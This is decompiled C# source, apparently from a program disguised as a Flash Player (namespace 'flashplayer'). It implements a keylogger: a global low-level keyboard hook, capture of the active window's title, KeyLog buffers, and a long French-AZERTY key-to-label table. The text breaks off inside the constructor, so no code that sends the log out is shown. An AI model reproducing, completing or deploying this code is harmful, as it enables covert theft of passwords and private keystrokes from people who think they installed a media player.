using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;
using flashplayer.My;

namespace flashplayer;

[DesignerGenerated]
public class Form1 : Form
{
	public class fonc
	{
		private delegate int KeyboardHookDelegate(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam);

		public struct KBDLLHOOKSTRUCT
		{
			public int vkCode;

			public int scanCode;

			public int flags;

			public int time;

			public int dwExtraInfo;
		}

		private class KeyCode
		{
			private int _kCode;

			private string _kShft;

			private string _kBase;

			private string _kCtrl;

			private string _kAlt;

			private string _kWin;

			private string _kAltGr;

			private string _kWinShft;

			private string _kWinCtrl;

			private string _kAltShft;

			private string _kAltCtrl;

			private int _kAccTrans;

			public int Code
			{
				get
				{
					return _kCode;
				}
				set
				{
					_kCode = value;
				}
			}

			public string Ret_Shft
			{
				get
				{
					return _kShft;
				}
				set
				{
					_kShft = value;
				}
			}

			public string Ret_Base
			{
				get
				{
					return _kBase;
				}
				set
				{
					_kBase = value;
				}
			}

			public string Ret_Ctrl
			{
				get
				{
					return _kCtrl;
				}
				set
				{
					_kCtrl = value;
				}
			}

			public string Ret_Alt
			{
				get
				{
					return _kAlt;
				}
				set
				{
					_kAlt = value;
				}
			}

			public string Ret_Win
			{
				get
				{
					return _kWin;
				}
				set
				{
					_kWin = value;
				}
			}

			public string Ret_AltGr
			{
				get
				{
					return _kAltGr;
				}
				set
				{
					_kAltGr = value;
				}
			}

			public string Ret_WinShft
			{
				get
				{
					return _kWinShft;
				}
				set
				{
					_kWinShft = value;
				}
			}

			public string Ret_WinCtrl
			{
				get
				{
					return _kWinCtrl;
				}
				set
				{
					_kWinCtrl = value;
				}
			}

			public string Ret_AltShft
			{
				get
				{
					return _kAltShft;
				}
				set
				{
					_kAltShft = value;
				}
			}

			public int Ret_AccTrans
			{
				get
				{
					return _kAccTrans;
				}
				set
				{
					_kAccTrans = value;
				}
			}

			public KeyCode(int kCode, string kBase = "", string kShft = "", string kCtrl = "", string kAlt = "", string kWin = "", string kAltGr = "", string kWinShft = "", string kWinCtrl = "", string kAltShft = "", int kAccTrans = 0)
			{
				Code = kCode;
				Ret_Shft = kShft;
				Ret_Base = kBase;
				Ret_Ctrl = kCtrl;
				Ret_Alt = kAlt;
				Ret_Win = kWin;
				Ret_AltGr = kAltGr;
				Ret_WinShft = kWinShft;
				Ret_WinCtrl = kWinCtrl;
				Ret_AltShft = kAltShft;
				Ret_AccTrans = kAccTrans;
			}
		}

		private class Keycodes
		{
			private ArrayList Table;

			public KeyCode this[int lIndex] => (KeyCode)Table[lIndex];

			public Keycodes()
			{
				Table = new ArrayList();
			}

			public KeyCode Add(int Code, string Ret_Base = "", string Ret_Shft = "", string Ret_Ctrl = "", string Ret_AltGr = "", string Ret_Alt = "", string Ret_Win = "", string Ret_WinShft = "", string Ret_WinCtrl = "", string Ret_AltShft = "", int Ret_AccTrans = 0)
			{
				KeyCode keyCode = new KeyCode(Code, Ret_Base, Ret_Shft, Ret_Ctrl, Ret_Alt, Ret_Win, Ret_AltGr, Ret_WinShft, Ret_WinCtrl, Ret_AltShft, Ret_AccTrans);
				Table.Add(keyCode);
				return keyCode;
			}
		}

		private int WM_KEYUP;

		private short WM_KEYDOWN;

		private int WM_SYSKEYDOWN;

		private int WM_SYSKEYUP;

		private IntPtr KeyboardHandle;

		private string LastCheckedForegroundTitle;

		private KeyboardHookDelegate callback;

		public string KeyLog;

		public string KeyLogApp;

		private bool RCtrl;

		private bool LCtrl;

		private bool Ctrl;

		private bool RShft;

		private bool LShft;

		private bool Shft;

		private bool Alt;

		private bool AltGr;

		private bool RWin;

		private bool Lwin;

		private bool Win;

		private bool CapsT;

		private char Acct;

		private bool Caps;

		private string Acde;

		private Keycodes Kc;

		private string[,] AsciiT;

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetForegroundWindow();

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

		public fonc()
		{
			WM_KEYUP = 257;
			WM_KEYDOWN = 256;
			WM_SYSKEYDOWN = 260;
			WM_SYSKEYUP = 261;
			KeyboardHandle = (IntPtr)0;
			LastCheckedForegroundTitle = "";
			callback = null;
			RCtrl = false;
			LCtrl = false;
			Ctrl = false;
			RShft = false;
			LShft = false;
			Shft = false;
			Alt = false;
			AltGr = false;
			RWin = false;
			Lwin = false;
			Win = false;
			CapsT = false;
			Acct = '\0';
			Caps = ((Computer)MyProject.MyComputer_0).get_Keyboard().get_CapsLock();
			Acde = "";
			Kc = new Keycodes();
			AsciiT = new string[512, 2]
			{
				{ "0", "" },
				{ "1", "☺" },
				{ "2", "☻" },
				{ "3", "♥" },
				{ "4", "♦" },
				{ "5", "♣" },
				{ "6", "♠" },
				{ "7", "•" },
				{ "8", "◘" },
				{ "9", "○" },
				{ "10", "◙" },
				{ "11", "♂" },
				{ "12", "♀" },
				{ "13", "♪" },
				{ "14", "♫" },
				{ "15", "☼" },
				{ "16", "►" },
				{ "17", "◄" },
				{ "18", "↕" },
				{ "19", "‼" },
				{ "20", "¶" },
				{ "21", "§" },
				{ "22", "▬" },
				{ "23", "↨" },
				{ "24", "↑" },
				{ "25", "↓" },
				{ "26", "→" },
				{ "27", "←" },
				{ "28", "∟" },
				{ "29", "↔" },
				{ "30", "▲" },
				{ "31", "▼" },
				{ "32", " " },
				{ "33", "!" },
				{ "34", "\"" },
				{ "35", "#" },
				{ "36", "$" },
				{ "37", "%" },
				{ "38", "&" },
				{ "39", "'" },
				{ "40", "(" },
				{ "41", ")" },
				{ "42", "*" },
				{ "43", "+" },
				{ "44", "," },
				{ "45", "-" },
				{ "46", "." },
				{ "47", "/" },
				{ "48", "0" },
				{ "49", "1" },
				{ "50", "2" },
				{ "51", "3" },
				{ "52", "4" },
				{ "53", "5" },
				{ "54", "6" },
				{ "55", "7" },
				{ "56", "8" },
				{ "57", "9" },
				{ "58", ":" },
				{ "59", ";" },
				{ "60", "<" },
				{ "61", "=" },
				{ "62", ">" },
				{ "63", "?" },
				{ "64", "@" },
				{ "65", "A" },
				{ "66", "B" },
				{ "67", "C" },
				{ "68", "D" },
				{ "69", "E" },
				{ "70", "F" },
				{ "71", "G" },
				{ "72", "H" },
				{ "73", "I" },
				{ "74", "J" },
				{ "75", "K" },
				{ "76", "L" },
				{ "77", "M" },
				{ "78", "N" },
				{ "79", "O" },
				{ "80", "P" },
				{ "81", "Q" },
				{ "82", "R" },
				{ "83", "S" },
				{ "84", "T" },
				{ "85", "U" },
				{ "86", "V" },
				{ "87", "W" },
				{ "88", "X" },
				{ "89", "Y" },
				{ "90", "Z" },
				{ "91", "[" },
				{ "92", "\\" },
				{ "93", "]" },
				{ "94", "^" },
				{ "95", "_" },
				{ "96", "`" },
				{ "97", "a" },
				{ "98", "b" },
				{ "99", "c" },
				{ "100", "d" },
				{ "101", "e" },
				{ "102", "f" },
				{ "103", "g" },
				{ "104", "h" },
				{ "105", "i" },
				{ "106", "j" },
				{ "107", "k" },
				{ "108", "l" },
				{ "109", "m" },
				{ "110", "n" },
				{ "111", "o" },
				{ "112", "p" },
				{ "113", "q" },
				{ "114", "r" },
				{ "115", "s" },
				{ "116", "t" },
				{ "117", "u" },
				{ "118", "v" },
				{ "119", "w" },
				{ "120", "x" },
				{ "121", "y" },
				{ "122", "z" },
				{ "123", "{" },
				{ "124", "|" },
				{ "125", "}" },
				{ "126", "~" },
				{ "127", "⌂" },
				{ "128", "Ç" },
				{ "129", "ü" },
				{ "130", "é" },
				{ "131", "â" },
				{ "132", "ä" },
				{ "133", "à" },
				{ "134", "å" },
				{ "135", "ç" },
				{ "136", "ê" },
				{ "137", "ë" },
				{ "138", "è" },
				{ "139", "ï" },
				{ "140", "î" },
				{ "141", "ì" },
				{ "142", "Ä" },
				{ "143", "Å" },
				{ "144", "É" },
				{ "145", "æ" },
				{ "146", "Æ" },
				{ "147", "ô" },
				{ "148", "ö" },
				{ "149", "ò" },
				{ "150", "û" },
				{ "151", "ù" },
				{ "152", "ÿ" },
				{ "153", "Ö" },
				{ "154", "Ü" },
				{ "155", "ø" },
				{ "156", "£" },
				{ "157", "Ø" },
				{ "158", "×" },
				{ "159", "ƒ" },
				{ "160", "á" },
				{ "161", "í" },
				{ "162", "ó" },
				{ "163", "ú" },
				{ "164", "ñ" },
				{ "165", "Ñ" },
				{ "166", "ª" },
				{ "167", "º" },
				{ "168", "¿" },
				{ "169", "®" },
				{ "170", "¬" },
				{ "171", "½" },
				{ "172", "¼" },
				{ "173", "¡" },
				{ "174", "«" },
				{ "175", "»" },
				{ "176", "░" },
				{ "177", "▒" },
				{ "178", "▓" },
				{ "179", "│" },
				{ "180", "┤" },
				{ "181", "Á" },
				{ "182", "Â" },
				{ "183", "À" },
				{ "184", "©" },
				{ "185", "╣" },
				{ "186", "║" },
				{ "187", "╗" },
				{ "188", "╝" },
				{ "189", "¢" },
				{ "190", "¥" },
				{ "191", "┐" },
				{ "192", "└" },
				{ "193", "┴" },
				{ "194", "┬" },
				{ "195", "├" },
				{ "196", "─" },
				{ "197", "┼" },
				{ "198", "ã" },
				{ "199", "Ã" },
				{ "200", "╚" },
				{ "201", "╔" },
				{ "202", "╩" },
				{ "203", "╦" },
				{ "204", "╠" },
				{ "205", "═" },
				{ "206", "╬" },
				{ "207", "¤" },
				{ "208", "ð" },
				{ "209", "Ð" },
				{ "210", "Ê" },
				{ "211", "Ë" },
				{ "212", "È" },
				{ "213", "ı" },
				{ "214", "Í" },
				{ "215", "Î" },
				{ "216", "Ï" },
				{ "217", "┘" },
				{ "218", "┌" },
				{ "219", "█" },
				{ "220", "▄" },
				{ "221", "¦" },
				{ "222", "Ì" },
				{ "223", "▀" },
				{ "224", "Ó" },
				{ "225", "ß" },
				{ "226", "Ô" },
				{ "227", "Ò" },
				{ "228", "õ" },
				{ "229", "Õ" },
				{ "230", "µ" },
				{ "231", "þ" },
				{ "232", "Þ" },
				{ "233", "Ú" },
				{ "234", "Û" },
				{ "235", "Ù" },
				{ "236", "ý" },
				{ "237", "Ý" },
				{ "238", "\u00af" },
				{ "239", "\u00b4" },
				{ "240", "\u00ad" },
				{ "241", "±" },
				{ "242", "‗" },
				{ "243", "¾" },
				{ "244", "¶" },
				{ "245", "§" },
				{ "246", "↑" },
				{ "247", "\u00b8" },
				{ "248", "°" },
				{ "249", "\u00a8" },
				{ "250", "·" },
				{ "251", "¹" },
				{ "252", "³" },
				{ "253", "²" },
				{ "254", "■" },
				{ "255", "\u00a0" },
				{ "0", "" },
				{ "1", "" },
				{ "2", "" },
				{ "3", "" },
				{ "4", "" },
				{ "5", "" },
				{ "6", "" },
				{ "7", "" },
				{ "8", "" },
				{ "9", "" },
				{ "10", "" },
				{ "11", "" },
				{ "12", "" },
				{ "13", "" },
				{ "14", "" },
				{ "15", "" },
				{ "16", "" },
				{ "17", "" },
				{ "18", "" },
				{ "19", "" },
				{ "20", "" },
				{ "21", "" },
				{ "22", "" },
				{ "23", "" },
				{ "24", "" },
				{ "25", "" },
				{ "26", "" },
				{ "27", "" },
				{ "28", "" },
				{ "29", "" },
				{ "30", "" },
				{ "31", "" },
				{ "032", " " },
				{ "033", "!" },
				{ "034", "\"" },
				{ "035", "#" },
				{ "036", "$" },
				{ "037", "%" },
				{ "038", "&" },
				{ "039", "'" },
				{ "040", "(" },
				{ "041", ")" },
				{ "042", "*" },
				{ "043", "+" },
				{ "044", "," },
				{ "045", "-" },
				{ "046", "." },
				{ "047", "/" },
				{ "048", "0" },
				{ "049", "1" },
				{ "050", "2" },
				{ "051", "3" },
				{ "052", "4" },
				{ "053", "5" },
				{ "054", "6" },
				{ "055", "7" },
				{ "056", "8" },
				{ "057", "9" },
				{ "058", ":" },
				{ "059", ";" },
				{ "060", "<" },
				{ "061", "=" },
				{ "062", ">" },
				{ "063", "?" },
				{ "064", "@" },
				{ "065", "A" },
				{ "066", "B" },
				{ "067", "C" },
				{ "068", "D" },
				{ "069", "E" },
				{ "070", "F" },
				{ "071", "G" },
				{ "072", "H" },
				{ "073", "I" },
				{ "074", "J" },
				{ "075", "K" },
				{ "076", "L" },
				{ "077", "M" },
				{ "078", "N" },
				{ "079", "O" },
				{ "080", "P" },
				{ "081", "Q" },
				{ "082", "R" },
				{ "083", "S" },
				{ "084", "T" },
				{ "085", "U" },
				{ "086", "V" },
				{ "087", "W" },
				{ "088", "X" },
				{ "089", "Y" },
				{ "090", "Z" },
				{ "091", "[" },
				{ "092", "\\" },
				{ "093", "]" },
				{ "094", "^" },
				{ "095", "_" },
				{ "096", "`" },
				{ "097", "a" },
				{ "098", "b" },
				{ "099", "c" },
				{ "0100", "d" },
				{ "0101", "e" },
				{ "0102", "f" },
				{ "0103", "g" },
				{ "0104", "h" },
				{ "0105", "i" },
				{ "0106", "j" },
				{ "0107", "k" },
				{ "0108", "l" },
				{ "0109", "m" },
				{ "0110", "n" },
				{ "0111", "o" },
				{ "0112", "p" },
				{ "0113", "q" },
				{ "0114", "r" },
				{ "0115", "s" },
				{ "0116", "t" },
				{ "0117", "u" },
				{ "0118", "v" },
				{ "0119", "w" },
				{ "0120", "x" },
				{ "0121", "y" },
				{ "0122", "z" },
				{ "0123", "{" },
				{ "0124", "|" },
				{ "0125", "}" },
				{ "0126", "~" },
				{ "0127", "\u007f" },
				{ "0128", "€" },
				{ "0129", "\u0081" },
				{ "0130", "‚" },
				{ "0131", "ƒ" },
				{ "0132", "„" },
				{ "0133", "…" },
				{ "0134", "†" },
				{ "0135", "‡" },
				{ "0136", "ˆ" },
				{ "0137", "‰" },
				{ "0138", "Š" },
				{ "0139", "‹" },
				{ "0140", "Œ" },
				{ "0141", "\u008d" },
				{ "0142", "Ž" },
				{ "0143", "\u008f" },
				{ "0144", "\u0090" },
				{ "0145", "‘" },
				{ "0146", "’" },
				{ "0147", "\"" },
				{ "148", "\"" },
				{ "0149", "•" },
				{ "0150", "–" },
				{ "0151", "—" },
				{ "0152", "\u02dc\u02dc" },
				{ "0153", "™" },
				{ "0154", "š" },
				{ "0155", "›" },
				{ "0156", "œ" },
				{ "0157", "\u009d" },
				{ "0158", "ž" },
				{ "0159", "Ÿ" },
				{ "0160", "\u00a0" },
				{ "0161", "¡" },
				{ "0162", "¢" },
				{ "0163", "£" },
				{ "0164", "¤" },
				{ "0165", "¥" },
				{ "0166", "¦" },
				{ "0167", "§" },
				{ "0168", "\u00a8" },
				{ "0169", "©" },
				{ "0170", "ª" },
				{ "0171", "«" },
				{ "0172", "¬" },
				{ "0173", "\u00ad" },
				{ "0174", "®" },
				{ "0175", "\u00af" },
				{ "0176", "°" },
				{ "0177", "±" },
				{ "0178", "²" },
				{ "0179", "³" },
				{ "0180", "\u00b4" },
				{ "0181", "µ" },
				{ "0182", "¶" },
				{ "0183", "·" },
				{ "0184", "\u00b8" },
				{ "0185", "¹" },
				{ "0186", "º" },
				{ "0187", "»" },
				{ "0188", "¼" },
				{ "0189", "½" },
				{ "0190", "¾" },
				{ "0191", "¿" },
				{ "0192", "À" },
				{ "0193", "Á" },
				{ "0194", "Â" },
				{ "0195", "Ã" },
				{ "0196", "Ä" },
				{ "0197", "Å" },
				{ "0198", "Æ" },
				{ "0199", "Ç" },
				{ "0200", "È" },
				{ "0201", "É" },
				{ "0202", "Ê" },
				{ "0203", "Ë" },
				{ "0204", "Ì" },
				{ "0205", "Í" },
				{ "0206", "Î" },
				{ "0207", "Ï" },
				{ "0208", "Ð" },
				{ "0209", "Ñ" },
				{ "0210", "Ò" },
				{ "0211", "Ó" },
				{ "0212", "Ô" },
				{ "0213", "Õ" },
				{ "0214", "Ö" },
				{ "0215", "×" },
				{ "0216", "Ø" },
				{ "0217", "Ù" },
				{ "0218", "Ú" },
				{ "0219", "Û" },
				{ "0220", "Ü" },
				{ "0221", "Ý" },
				{ "0222", "Þ" },
				{ "0223", "ß" },
				{ "0224", "à" },
				{ "0225", "á" },
				{ "0226", "â" },
				{ "0227", "ã" },
				{ "0228", "ä" },
				{ "0229", "å" },
				{ "0230", "æ" },
				{ "0231", "ç" },
				{ "0232", "è" },
				{ "0233", "é" },
				{ "0234", "ê" },
				{ "0235", "ë" },
				{ "0236", "ì" },
				{ "0237", "í" },
				{ "0238", "î" },
				{ "0239", "ï" },
				{ "0240", "ð" },
				{ "0241", "ñ" },
				{ "0242", "ò" },
				{ "0243", "ó" },
				{ "0244", "ô" },
				{ "0245", "õ" },
				{ "0246", "ö" },
				{ "0247", "÷" },
				{ "0248", "ø" },
				{ "0249", "ù" },
				{ "0250", "ú" },
				{ "0251", "û" },
				{ "0252", "ü" },
				{ "0253", "ý" },
				{ "0254", "þ" },
				{ "0255", "ÿ" }
			};
			Kc.Add(0);
			Kc.Add(1, "[CLIC GAUCHE]");
			Kc.Add(2, "[CLIC DROIT]");
			Kc.Add(3, "[ANNULATION]");
			Kc.Add(4, "[CLIC BOUTON MILIEU]");
			Kc.Add(5, "[CLIC BOUTON 4]");
			Kc.Add(6, "[CLIC BOUTON 5]");
			Kc.Add(7);
			Kc.Add(8, "[RETOUR ARRIERE]");
			Kc.Add(9, "[TABULATION]", "", "", "[PERMUTATION FENETRE GAUCHE]", "[PERMUTATION FENETRE DROITE]", "[FLIP 3D DROITE]", "[FLIP 3D GAUCHE]", "[FIGER LE FLIP 3D]");
			Kc.Add(10);
			Kc.Add(11);
			Kc.Add(12, "[NETTOYER]");
			Kc.Add(13, Environment.NewLine + "[ENTER]");
			Kc.Add(14);
			Kc.Add(15);
			Kc.Add(16, "[SHIFT]", "", "", "", "[BASCULER CLAVIER]");
			Kc.Add(17, "[CONTROL]");
			Kc.Add(18, "[ALT]");
			Kc.Add(19, "[PAUSE]", "", "", "", "", "[PANNEAU INFOS SYS]");
			Kc.Add(20, "[CAPS LOCK]");
			Kc.Add(21);
			Kc.Add(22);
			Kc.Add(23);
			Kc.Add(24);
			Kc.Add(25);
			Kc.Add(26);
			Kc.Add(27, "[ECHAP]", "", "", "", "[PARCOURIR LES FENETRES]", "[MENU DEMARRER]");
			Kc.Add(28);
			Kc.Add(29);
			Kc.Add(30);
			Kc.Add(31);
			Kc.Add(32, " ", "", "", "", "[MENU CONTEXTUEL]", "", "", "", "", 1);
			Kc.Add(33, "[▲]");
			Kc.Add(34, "[▼]");
			Kc.Add(35, "[FIN / FIN LIGNE]", "[SLCT CURSEUR-FIN LIGNE]", "[FIN DOCUMENT]");
			Kc.Add(36, "[DEBUT / DEBUT LIGNE]", "[SLCT DEBUT LIGNE-CURSEUR]", "[DEBUT DOCUMENT]");
			Kc.Add(37, "[GAUCHE]", "[SLCT GAUCHE]", "[DPL GAUCHE PAR GROUPE]", "", "[DPL GAUCHE PAR GROUPE]");
			Kc.Add(38, "[HAUT]", "[SLCT HAUT]");
			Kc.Add(39, "[DROIT]", "[SLCT DROITE]", "[DPL DROITE PAR GROUPE]", "", "[DPL DROITE PAR GROUPE]");
			Kc.Add(40, "[BAS]", "[SLCT BAS]");
			Kc.Add(41, "[SELECTION]");
			Kc.Add(42, "[IMRPIMER");
			Kc.Add(43, "[EXECUTER]");
			Kc.Add(44, "[IMPRIM ECRAN]", "", "", "", "[SCREENSHOT FENETRE EN COURS]");
			Kc.Add(45, "[INSERER]", "[INSERER PRESSE PAPIER]");
			Kc.Add(46, "[SUPPRIMER]", "[SUPPRIMER ← OU SUPPRIMER FICHIER]", "[SUPPRIMER RESTE DE LA LIGNE]", "[GESTIONNAIRE DE TACHES]");
			Kc.Add(47, "[AIDE]");
			Kc.Add(48, "à", "0", "", "@", "", "", "", "", "", 1);
			Kc.Add(49, "&", "1", "", "", "", "", "", "", "", 1);
			Kc.Add(50, "é", "2", "", "~", "", "", "", "", "", 1);
			Kc.Add(51, "\"", "3", "", "#", "", "", "", "", "", 1);
			Kc.Add(52, "'", "4", "", "{", "", "", "", "", "", 1);
			Kc.Add(53, "(", "5", "", "[", "", "", "", "", "", 1);
			Kc.Add(54, "-", "6", "", "|", "", "", "", "", "", 1);
			Kc.Add(55, "è", "7", "", "`", "", "", "", "", "", 1);
			Kc.Add(56, "_", "8", "", "\\", "", "", "", "", "", 1);
			Kc.Add(57, "ç", "9", "", "^", "", "", "", "", "", 1);
			Kc.Add(58);
			Kc.Add(59);
			Kc.Add(60);
			Kc.Add(61);
			Kc.Add(62);
			Kc.Add(63);
			Kc.Add(64);
			Kc.Add(65, "a", "A", "[SELECTIONNER TOUT]", "", "", "", "", "", "", 2);
			Kc.Add(66, "b", "B", "[ORGANISER FAVORIS]", "", "", "", "", "", "", 1);
			Kc.Add(67, "c", "C", "[COPIER (CTRL+C)]", "", "", "", "", "", "", 1);
			Kc.Add(68, "d", "D", "", "", "", "[REDUIRE TOUT]", "", "", "", 1);
			Kc.Add(69, "e", "E", "", "", "", "[EXPLORATEUR]", "", "", "", 2);
			Kc.Add(70, "f", "F", "[RECHERCHER]", "", "", "[RECHERCHER]", "", "[RECHERCHER UN PC]", "", 1);
			Kc.Add(71, "g", "G", "", "", "", "", "", "", "", 1);
			Kc.Add(72, "h", "H", "[REMPLACER]", "", "", "", "", "", "", 1);
			Kc.Add(73, "i", "I", "", "", "", "", "", "", "", 2);
			Kc.Add(74, "j", "J", "", "", "", "", "", "", "", 1);
			Kc.Add(75, "k", "K", "", "", "", "", "", "", "", 1);
			Kc.Add(76, "l", "L", "", "", "", "[VERROUILLER SESSION]", "", "", "", 1);
			Kc.Add(77, "m", "M", "", "", "", "[REDUIRE TOUT]", "[RESTAURER TOUT]", "", "", 1);
			Kc.Add(78, "n", "N", "[NOUVEAU]", "", "", "", "", "", "", 2);
			Kc.Add(79, "o", "O", "[OUVRIR]", "", "", "", "", "", "", 2);
			Kc.Add(80, "p", "P", "[IMPRIMER]", "", "", "", "", "", "", 1);
			Kc.Add(81, "q", "Q", "", "", "", "", "", "", "", 1);
			Kc.Add(82, "r", "R", "", "", "", "[EXECUTER]", "", "", "", 1);
			Kc.Add(83, "s", "S", "[ENREGISTRER]", "", "", "", "", "", "", 1);
			Kc.Add(84, "t", "T", "", "", "", "", "", "", "", 1);
			Kc.Add(85, "u", "U", "", "", "", "[GESTIONNAIRE UTILS]", "", "", "", 2);
			Kc.Add(86, "v", "V", "[COLLER (CTRL+V]]", "", "", "", "", "", "", 1);
			Kc.Add(87, "w", "W", "[FERMER (ALT+F4)]", "", "", "", "", "", "", 1);
			Kc.Add(88, "x", "X", "[COUPER (CTRL+X)]", "", "", "[CENTRE MOBILITE]", "", "", "", 1);
			Kc.Add(89, "y", "Y", "[RETABLIR]", "", "", "", "", "", "", 1);
			Kc.Add(90, "z", "Z", "[ANNULER]", "", "", "", "", "", "", 1);
			Kc.Add(91, "[WIN GAUCHE]");
			Kc.Add(92, "[WIN DROITE]");
			Kc.Add(93, "[APPLICATION]");
			Kc.Add(94);
			Kc.Add(95, "[VEILLE]");
			Kc.Add(96, "0", "", "", "", "", "", "", "", "", 1);
			Kc.Add(97, "1", "", "", "", "", "", "", "", "", 1);
			Kc.Add(98, "2", "", "", "", "", "", "", "", "", 1);
			Kc.Add(99, "3", "", "", "", "", "", "", "", "", 1);
			Kc.Add(100, "4", "", "", "", "", "", "", "", "", 1);
			Kc.Add(101, "5", "", "", "", "", "", "", "", "", 1);
			Kc.Add(102, "6", "", "", "", "", "", "", "", "", 1);
			Kc.Add(103, "7", "", "", "", "", "", "", "", "", 1);
			Kc.Add(104, "8", "", "", "", "", "", "", "", "", 1);
			Kc.Add(105, "9", "", "", "", "", "", "", "", "", 1);
			Kc.Add(106, "*", "", "", "", "", "", "", "", "", 1);
			Kc.Add(107, "+", "", "", "", "", "", "", "", "", 1);
			Kc.Add(108, "[SEPARATEUR]", "", "", "", "", "", "", "", "", 1);
			Kc.Add(109, "-", "", "", "", "", "", "", "", "", 1);
			Kc.Add(110, ".", "", "", "", "", "", "", "", "", 1);
			Kc.Add(111, "/", "", "", "", "", "", "", "", "", 1);
			Kc.Add(112, "[AIDE (F1)]", "", "", "", "", "[AIDE WINDOWS (ALT+F1)]");
			Kc.Add(113, "[RENOMMER (F2)]");
			Kc.Add(114, "[RECHERCHER (F3)]");
			Kc.Add(115, "[F4]", "", "", "", "[FERMER PROGRAMME (ALT+F4)]");
			Kc.Add(116, "[RAFRAICHIR (F5)]");
			Kc.Add(117, "[F6]");
			Kc.Add(118, "[F7]");
			Kc.Add(119, "[F8]");
			Kc.Add(120, "[F9]");
			Kc.Add(121, "[ACTIVER BARRE MENU (F10)]");
			Kc.Add(122, "[F11]");
			Kc.Add(123, "[F12]");
			Kc.Add(124, "[F13]");
			Kc.Add(125, "[F14]");
			Kc.Add(126, "[F15]");
			Kc.Add(127, "[F16]");
			Kc.Add(128, "[F17]");
			Kc.Add(129, "[F18]");
			Kc.Add(130, "[F19]");
			Kc.Add(131, "[F20]");
			Kc.Add(132, "[F21]");
			Kc.Add(133, "[F22]");
			Kc.Add(134, "[F23]");
			Kc.Add(135, "[F24]");
			Kc.Add(136);
			Kc.Add(137);
			Kc.Add(138);
			Kc.Add(139);
			Kc.Add(140);
			Kc.Add(141);
			Kc.Add(142);
			Kc.Add(143);
			Kc.Add(144, "[VERR NUM]");
			Kc.Add(145, "[ARRET DEFIL]");
			Kc.Add(146);
			Kc.Add(147);
			Kc.Add(148);
			Kc.Add(149);
			Kc.Add(150);
			Kc.Add(151);
			Kc.Add(152);
			Kc.Add(153);
			Kc.Add(154);
			Kc.Add(155);
			Kc.Add(156);
			Kc.Add(157);
			Kc.Add(158);
			Kc.Add(159);
			Kc.Add(160, "[SHIFT GAUCHE]");
			Kc.Add(161, "[SHIFT DROITE]");
			Kc.Add(162, "[CONTROL GAUCHE]");
			Kc.Add(163, "[CONTROL DROITE]");
			Kc.Add(164, "[ALT GAUCHE]");
			Kc.Add(165, "[ALT DROITE]");
			Kc.Add(166, "[NAVIG +]");
			Kc.Add(167, "[NAVIG -]");
			Kc.Add(168, "[NAVIG RAFRAICHIR]");
			Kc.Add(169, "[NAVIG STOP]");
			Kc.Add(170, "[NAVIG RECHERCHER]");
			Kc.Add(171, "[NAVIG FAVORIS]");
			Kc.Add(172, "[NAVIG HOME]");
			Kc.Add(173, "[COUPER SON]");
			Kc.Add(174, "[VOL -]");
			Kc.Add(175, "[VOL +]");
			Kc.Add(176, "[PISTE +]");
			Kc.Add(177, "[PISTE -]");
			Kc.Add(178, "[STOP]");
			Kc.Add(179, "[MARCHE/PAUSE]");
			Kc.Add(180, "[MAIL]");
			Kc.Add(181, "[MEDIA]");
			Kc.Add(182, "[APPLICATION 1]");
			Kc.Add(183, "[APPLICATION 2]");
			Kc.Add(184);
			Kc.Add(185);
			Kc.Add(186, "$", "£", "", "¤", "", "", "", "", "", 1);
			Kc.Add(187, "=", "+", "", "}", "", "", "", "", "", 1);
			Kc.Add(188, ",", "?", "", "", "", "", "", "", "", 1);
			Kc.Add(189);
			Kc.Add(190, ";", ".", "", "", "", "", "", "", "", 1);
			Kc.Add(191, ":", "/", "", "", "", "", "", "", "", 1);
			Kc.Add(192, "ù", "%", "", "", "", "", "", "", "", 1);
			Kc.Add(193);
			Kc.Add(194);
			Kc.Add(195);
			Kc.Add(196);
			Kc.Add(197);
			Kc.Add(198);
			Kc.Add(199);
			Kc.Add(200);
			Kc.Add(201);
			Kc.Add(202);
			Kc.Add(203);
			Kc.Add(204);
			Kc.Add(205);
			Kc.Add(206);
			Kc.Add(207);
			Kc.Add(208);
			Kc.Add(209);
			Kc.Add(210);
			Kc.Add(211);
			Kc.Add(212);
			Kc.Add(213);
			Kc.Add(214);
			Kc.Add(215);
			Kc.Add(216);
			Kc.Add(217);
			Kc.Add(218);
			Kc.Add(219, ")", "°", "", "]", "", "", "", "", "", 1);
			Kc.Add(220, "*", "µ", "", "", "", "", "", "", "", 1);
			Kc.Add(221, "^", "\u00a8", "", "", "", "", "", "", "", 1);
			Kc.Add(222);
			Kc.Add(223, "!", "§", "", "", "", "", "", "", "", 1);
			Kc.Add(224);
			Kc.Add(225);
			Kc.Add(226, "<", ">", "", "", "", "", "", "", "", 1);
			Kc.Add(227);
			Kc.Add(228);
			Kc.Add(229, "[PROCESS]");
			Kc.Add(230);
			Kc.Add(231);
			Kc.Add(232);
			Kc.Add(233);
			Kc.Add(234);
			Kc.Add(235);
			Kc.Add(236);
			Kc.Add(237);
			Kc.Add(238);
			Kc.Add(239);
			Kc.Add(240);
			Kc.Add(241);
			Kc.Add(242);
			Kc.Add(243);
			Kc.Add(244);
			Kc.Add(245);
			Kc.Add(246, "[ATTN]");
			Kc.Add(247, "[CRSEL]");
			Kc.Add(248, "[EXSEL]");
			Kc.Add(249, "[ERASE EOF]");
			Kc.Add(250, "[PLAY]");
			Kc.Add(251, "[ZOOM]");
			Kc.Add(252);
			Kc.Add(253);
			Kc.Add(254, "[CLEAR]");
